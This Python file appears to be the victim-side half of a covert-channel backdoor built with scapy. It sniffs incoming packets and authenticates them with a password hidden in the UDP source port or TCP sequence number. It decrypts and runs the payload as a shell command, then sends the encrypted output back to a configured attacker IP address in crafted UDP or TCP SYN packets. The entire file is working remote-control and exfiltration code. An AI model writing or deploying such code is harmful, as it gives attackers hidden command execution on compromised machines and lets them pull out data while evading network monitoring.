import subprocess
from encryption import encrypt, decrypt
from scapy.all import *
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP, TCP
from scapy.packet import Raw
import config


def check_packet(packet):
    if packet.haslayer(UDP) and packet.haslayer(Raw):
        udp_packet = packet[UDP]
        encrypted_password_int = udp_packet.sport
        encrypted_command = packet[Raw].load

        encrypted_password_bytes = encrypted_password_int.to_bytes((encrypted_password_int.bit_length() + 7) // 8, 'big')

        auth_password = decrypt(encrypted_password_bytes)

        if auth_password == config.auth_password:
            decrypted_command = decrypt(encrypted_command)

            print(f"Command to run: {decrypted_command}")

            # Run Command
            result = subprocess.run(decrypted_command, shell=True, capture_output=True, text=True)

            # Start setting up packet to send back to client
            ip_packet = IP(dst=config.attacker_ip, src=config.victim_ip)
            udp_packet = UDP(dport=config.attacker_command_port, sport=config.victim_port)

            # Process succeeded
            if result.returncode == 0:
                res = result.stdout
                print("Command successfully completed, result sent back to client.")
                
                # Encrypt result
                encrypted_result = encrypt(res)

                # Send successful result back to client
                crafted_packet = ip_packet / udp_packet / encrypted_result
                send(crafted_packet)
            # Process failed
            else:
                res = result.stderr
                print(f"Command failed to run, error: {res}")

                # Encrypt result
                encrypted_result = encrypt(res)

                # Send error back to client
                crafted_packet = ip_packet / udp_packet / encrypted_result
                send(crafted_packet)

    if packet.haslayer(TCP) and packet.haslayer(Raw):
        tcp_packet = packet[TCP]
        encrypted_password_int = tcp_packet.seq
        encrypted_command = packet[Raw].load

        encrypted_password_bytes = encrypted_password_int.to_bytes((encrypted_password_int.bit_length() + 7) // 8, 'big')

        auth_password = decrypt(encrypted_password_bytes)

        if auth_password == config.auth_password:
            decrypted_command = decrypt(encrypted_command)

            print(f"Command to run: {decrypted_command}\n")

            # Run Command
            result = subprocess.run(decrypted_command, shell=True, capture_output=True, text=True)

            # Start setting up packet to send back to client
            ip_packet = IP(dst=config.attacker_ip, src=config.victim_ip)
            
            # Process succeeded
            if result.returncode == 0:
                res = result.stdout
                print(res)
                # Encrypt result
                encrypted_result = encrypt(res)
                
                tcp_packet = TCP(dport=config.attacker_command_port, sport=config.victim_port, flags="S")
            
                # Send successful result back to client
                crafted_packet = ip_packet / tcp_packet / encrypted_result
                send(crafted_packet, verbose=False)
                print("Command successfully completed, result sent back to client.\n")
            # Process failed
            else:
                res = result.stderr
                
                # Encrypt result
                encrypted_result = encrypt(res)

                tcp_packet = TCP(dport=config.attacker_command_port, sport=config.victim_port, flags="S")

                # Send error back to client
                crafted_packet = ip_packet / tcp_packet / encrypted_result
                send(crafted_packet, verbose=False)
                print(f"Command failed to run, error: {res}\n")


def command():
     while True:
        sniff(filter="dst host " + str(config.victim_ip) + " and dst port " + str(config.victim_port), prn=check_packet)

